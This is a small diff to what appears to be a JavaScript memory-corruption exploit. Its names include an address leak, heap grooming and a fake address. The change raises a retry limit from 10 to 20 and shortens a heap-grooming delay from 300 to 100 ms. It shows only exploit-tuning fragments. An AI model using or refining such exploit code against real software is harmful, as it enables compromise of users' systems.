@@ -26,7 +26,7 @@ let keepAlive = null
 let onEvent = null
 let settleResolve = null
 let settleReject = null
-const MAX_ATTEMPTS = 10
+const MAX_ATTEMPTS = 20
 let memoryView = null
 let memoryMirror = null
 let targetView = null
@@ -657,7 +657,7 @@ function finishAddressLeak() {
   getterCarrier = null;
   preparedSymbolObject = null;
   capturedWords = null;
-  setTimeout(() => groomHeap(fakeAddress, holderAddress), 300);
+  setTimeout(() => groomHeap(fakeAddress, holderAddress), 100);
 }
 
 // Stage 5: retry placement misses or publish the validated memory window.
